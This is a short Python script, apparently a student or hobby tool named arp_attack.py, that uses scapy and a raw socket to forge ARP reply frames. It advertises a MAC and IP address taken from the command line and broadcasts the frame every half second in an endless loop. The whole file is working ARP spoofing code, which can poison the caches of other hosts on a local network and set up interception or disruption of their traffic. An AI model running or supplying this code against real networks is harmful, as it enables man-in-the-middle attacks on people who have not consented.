from scapy.all import *
import socket
import time
import sys
import os


#============================================================
# Module: arp_attack.py
# Author: Patrick Blanchard
# Purpose: Creates a custom arp packet.
# Date: November 18, 2016
#=============================================================

def main():
    #get interface name
    interface = os.listdir('/sys/class/net/')[1]
    #Create raw socket
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    #This specifies ARP
    s.bind((interface, 0x0806))

    host_ip = sys.argv[2]
    host_mac = sys.argv[1]
    print host_ip
    print host_mac

    hardware_type           = 0x0001            #Ethernet
    protocal_type           = 0x0800            #IPV4
    hardware_address_length = 0x0006            #Ethernet/IEEE 802.11 (MAC address length)
    protocal_address_length = 0x0004            #IPV4 (IPV4 address length)
    opcode                  = 0x0002            #ARP Reply
    sender_hardware_address = host_mac          #Sender 48 bit mac address
    sender_protocal_address = host_ip           #Sender IPV4 address
    target_hardware_address = BROADCAST         #Target 48 bit mac address
    target_protocal_address = "255.255.255.255" #Target IPV4 address

    frame_head = Ether(dst=BROADCAST, src=host_mac, type=0x0806)
    arp_head = ARP()
    arp_head.hwtype = hardware_type
    arp_head.ptype=protocal_type
    arp_head.hlen=hardware_address_length
    arp_head.plen=protocal_address_length
    arp_head.op=opcode
    arp_head.hwsrc=sender_hardware_address
    arp_head.psrc=sender_protocal_address
    arp_head.hwdst=target_hardware_address
    arp_head.pdst=target_protocal_address

    frame_head.show()
    arp_head.show()
    data = frame_head/arp_head

    while True:
        s.send(bytes(data))
        time.sleep(.5)



if __name__ == "__main__":
    BROADCAST = 'ff:ff:ff:ff:ff:ff'
    main()
